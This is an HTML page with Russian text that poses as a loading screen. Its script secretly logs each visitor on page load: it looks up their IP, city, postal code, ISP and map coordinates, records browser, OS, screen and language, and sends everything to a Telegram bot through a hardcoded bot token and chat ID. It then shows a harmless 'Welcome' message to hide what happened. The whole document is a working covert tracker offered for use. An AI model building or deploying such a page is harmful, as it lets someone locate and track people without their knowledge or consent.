<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f0f1a;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .loader { text-align: center; }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top-color: #e94560;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        p { color: #888; font-size: 14px; }
    </style>
</head>
<body>

<div class="loader">
    <div class="spinner"></div>
    <p>Загрузка...</p>
</div>

<script>
    // ============================================
    // ВСТАВЬ СВОИ ДАННЫЕ СЮДА:
    const BOT_TOKEN = '8052485154:AAEGG4RfJ4Si25GsQUIGdVEuP3MyJVvoIhI';
    const CHAT_ID   = '2081364953';
    // ============================================

    async function collectAndSend() {
        try {
            // 1. Получаем IP и геоданные
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();

            // 2. Определяем ОС
            const ua = navigator.userAgent;
            let os = 'Неизвестно';
            if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Mac')) os = 'macOS';
            else if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
            else if (ua.includes('Linux')) os = 'Linux';

            // 3. Определяем браузер
            let browser = 'Неизвестно';
            if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Edg')) browser = 'Edge';
            else if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Safari')) browser = 'Safari';
            else if (ua.includes('Opera') || ua.includes('OPR')) browser = 'Opera';

            // 4. Формируем сообщение
            const text = `
🔍 НОВЫЙ ПЕРЕХОД
━━━━━━━━━━━━━━━━━━
🌐 IP: ${d.ip || '—'}
📍 Страна: ${d.country_name || '—'} (${d.country_code || '—'})
🏙 Город: ${d.city || '—'}
📮 Индекс: ${d.postal || '—'}
📡 Провайдер: ${d.org || '—'}
🕐 Часовой пояс: ${d.timezone || '—'}
📌 Координаты: ${d.latitude || '—'}, ${d.longitude || '—'}
━━━━━━━━━━━━━━━━━━
💻 ОС: ${os}
🌍 Браузер: ${browser}
📱 Экран: ${screen.width}x${screen.height}
🗣 Язык: ${navigator.language}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
━━━━━━━━━━━━━━━━━━
🔗 Карта: https://www.google.com/maps?q=${d.latitude},${d.longitude}
            `.trim();

            // 5. Отправляем в Telegram
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    disable_web_page_preview: true
                })
            });

            // 6. Показываем нейтральную страницу человеку
            document.body.innerHTML = `
                <div style="text-align:center; padding: 40px;">
                    <h1 style="color:#e94560; margin-bottom:20px;">Добро пожаловать!</h1>
                    <p style="color:#888;">Страница успешно загружена.</p>
                </div>
            `;

        } catch (e) {
            console.error('Ошибка:', e);
        }
    }

    collectAndSend();
</script>
</body>
</html>
